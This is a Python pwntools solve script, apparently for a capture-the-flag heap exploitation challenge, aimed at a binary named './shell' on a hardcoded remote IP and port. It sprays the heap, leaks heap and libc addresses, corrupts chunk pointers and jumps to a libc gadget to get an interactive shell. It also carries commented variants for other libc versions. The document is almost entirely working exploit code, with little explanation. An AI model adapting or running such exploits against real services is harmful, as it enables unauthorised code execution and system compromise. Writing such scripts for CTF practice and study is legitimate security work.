from pwn import *
context.binary = ELF('./shell')
elf = context.binary
libc = context.binary.libc

#context.log_level = 'debug'

def dbg():
    gdb.attach(p)
    raw_input("dbg")

def menu(ch):
	p.sendlineafter(">> ", str(ch))
	pass

def add(number, size, msg):
	menu(1)
	p.sendlineafter(">> ", str(number))
	p.sendlineafter(">> ", str(size))

	print("lenMsg: {}".format(len(msg)))
	i = 0
	for data in msg:
		p.sendlineafter(">> ", data)					# len(data) = size
		print("index: {}".format(i))
		i += 1
	print("add {} chunks Success!".format(number))
	pass

def delete():
	menu(3)
	print("Delete Done!")
	pass

def edit(index, msg):
	menu(2)
	p.sendlineafter(">> ", str(index))
	p.sendlineafter(">> ", msg)
	pass

def showContent(sindex, eindex):
	menu(4)
	p.sendlineafter(">> ", str(sindex))
	p.sendlineafter(">> ", str(eindex))

	pass

def showTag(index):
	menu(5)
	p.sendlineafter(">> ", str(index))
	pass


def exploit():
    #add & delete
	msg = []
	for i in range(0x10):
		msg.append('X' * (0x20000 - 1))
	add(0x10, 0x20000, msg)

	delete()

	# HeapSpray
	magic_addr = 0x58585858
	msg = []
	for i in range(0x100):
		msg.append('X' * (0x20000 - 1))

	add(0x100, 0x20000, msg)
	# More
	msg = []
	for i in range(0x10):
		msg.append('X' * (0x1000 - 1))
	add(0x10, 0x1000, msg)
	
	#delete
	delete()

	#undefined
	msg = []
	for i in range(0x10):
		msg.append('X' * (0x100 - 1))
	add(0x10, 0x100, msg)
	
	# modify [magic_addr] -= 1
	showTag(0x100)
	

	showContent(0, 0xff)
	index = 0
	offset = 0
	for i in range(0x100):
		line = p.recvline()
		idx = line.index('Message:')
		line = line[idx + 9:-1]
		if 'W' in line:
			index = i
			offset = line.index('W')
			break

	print("index: {}".format(index))
	print("offset: {}".format(offset))
	
	# libc2.7
	# box + offset + chunk_header
	heap_offset = 0x20010 * index + offset + 8
	#libc 2.3
	#heap_offset = 0x20008 * index + offset + 8

	heap_Start = magic_addr - heap_offset
	print("heap_start: ", hex(heap_Start))

	#in libc2.7 0x110 
	# first 7 will be in tcache
	# last 3 in unsorted bin
	delete()

	#dbg()

	# 0x00 - 1
	msg = []
			#libc 2.3
			#msg.append(p32(heap_Start + 0x20008*0x100 + 8 + 3) * (0x1000/4 - 1))
	for i in range(0x10):
		msg.append(p32(heap_Start + 0x20010*0x100 + 0x110 * 0x7 + 8 + 3) * (0x1000/4 - 1))
	add(0x10, 0x1000, msg)
	
	#dbg()
	delete()

	#first 7 comes tcache
	msg = []
	for i in range(0x10):
		msg.append("aaa")
	add(0x10, 0x100, msg)
	
	
	# 0x00 - 1 = 0xff

	# leak libc
	# in libc2.3
	# showTag(0x100)
	# in libc2.7
	showTag(0x107)
	#context.log_level = 'debug'

	showContent(0x100, 0x10f)

	for i in range(0x10):
		out = p.recvline()
		idx = out.index('Message:')
		out = out[idx+9 : -1]
		if 'aaa' != out:
			# libc2.3			
			# libc_addr = u32(out[4 : 8]) + 1 - 0x1b27b0
			# libc2.7									#local	#remote
			libc_addr = u32(out[4 : 8]) + 1 - 0x1b27b0 - 0x26028 + 0x3000
			break
	print("libc_addr: ", hex(libc_addr))

	delete()
	# libc2.3 one_gadget is no use
	magic_gadget1 = 0x00164301  # 0x00164301 : xchg eax, ecx ; cld ; call dword ptr [eax]
	magic_gadget2 = 0x00073b6a  # 0x00073b6a : xchg eax, esp ;  ;mov esi, eax ; add esp, 0x14 ; mov eax, esi ; pop ebx ; pop esi ; ret

	#magic_gadget3 = 0x00018ea7  # 0x00018ea7 : xchg eax, esp ; ret
	system_offest = 0x3ada0
	binsh_addr = 0x15ba0b

	#dbg()

	# chunk' bk
	msg = []
	for i in range(0x10):
		#libc 2.3
		#msg.append(p32(heap_Start + 0x20008*0x100 + 0xc) * (0x1000/4 - 1))

		# libc 2.7
		msg.append(p32(heap_Start + 0x20010*0x100 + 0x110 * 7 + 0xc) * (0x1000/4 - 1))
	add(0x10, 0x1000, msg)
	delete()
	
	'''
	# cover bk = 0
	# then call gadget1
	# libc2.3
	# gadget1 will call gadget2
	msg = []
	for i in range(0x10):
		msg.append((p32(libc_addr + magic_gadget2) + p32(0) + p32(libc_addr
	+ magic_gadget1) + p32(0) * 4 + p32(libc_addr + system_offest) + p32(0) +
	p32(libc_addr + binsh_addr)).ljust(0x0100 -1, '\x00'))

	add(0x10, 0x100, msg)
	'''
	#libc2.7
	gadget = 0x3cbec
	msg = []
	for i in range(0x10):
		msg.append(('a'*4 + p32(0) + p32(libc_addr + gadget)).ljust(0x0100 -1, '\x00'))

	add(0x10, 0x100, msg)
	# dbg()
	# libc2.3
	# showTag(0x100)
	# call rop
	showTag(0x107)

	p.interactive()
	p.close()


if __name__ == '__main__':
	#p = process('./shell', env={"LD_PRELOAD":"./libc.so.6"})
	p = remote('39.107.46.219', 40018)
	exploit()
